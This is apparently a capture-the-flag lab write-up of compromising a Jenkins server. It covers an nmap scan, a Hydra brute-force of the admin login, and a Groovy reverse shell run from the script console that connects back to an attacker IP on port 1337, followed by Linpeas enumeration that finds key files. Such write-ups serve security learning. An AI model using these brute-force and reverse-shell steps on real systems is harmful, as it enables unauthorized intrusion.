Bismisllahirr Rahmaanirr Rahim

After running a nmap scan, I got some ports that are opened and I knew that was what I will be working with. 

```❯ nmap -p- --min-rate 1000 -A 10.150.150.38 -Pn -oN juniordev.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 16:57 WAT
Nmap scan report for 10.150.150.38
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
30609/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.27.v20200227)
| http-robots.txt: 1 disallowed entry 
|_/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   194.49 ms 10.66.66.1
2   194.47 ms 10.150.150.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.64 seconds
```
Knowing fully well that we have just two ports opened, I proceeded to enumerate the http port as ssh can't come first. I was able to get a login page in which i brute force using hydra.

```
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-17 17:02:16
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.150.150.38:30609/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[STATUS] 417.00 tries/min, 417 tries in 00:01h, 14343982 to do in 573:19h, 16 active
[30609][http-post-form] host: 10.150.150.38   login: admin   password: matrix
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-17 17:04:06

```
 And then I was able to get a password to login to the admin dashboard. From there I played around to see if there is anything. I enumerated....more like fuck around and find out. I then came across a script console that runs a groovy code
![[Pasted image 20250217172236.png]]

Then i decided to check if there are scripts online i can use to get reverse shell and I got something for windows but this jenkins was running on Linux so I edited the script to be able to work for linux and bankaiiiii we got a shell.

```
String host="10.66.67.6";
int port=1337;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

The above code was used to get a shell. After getting a shell I moved around to get to see if i will be able to see the file in the home dir but I did not get anything so I decided to download Linpeas on it and run it. As we will have it, we have something about keys.

![[Pasted image 20250217173714.png]]

We can see master.key and secret.key which might just lead us to something good.  And then we also have something which is looking like a flag hehe

![[Pasted image 20250217173928.png]]
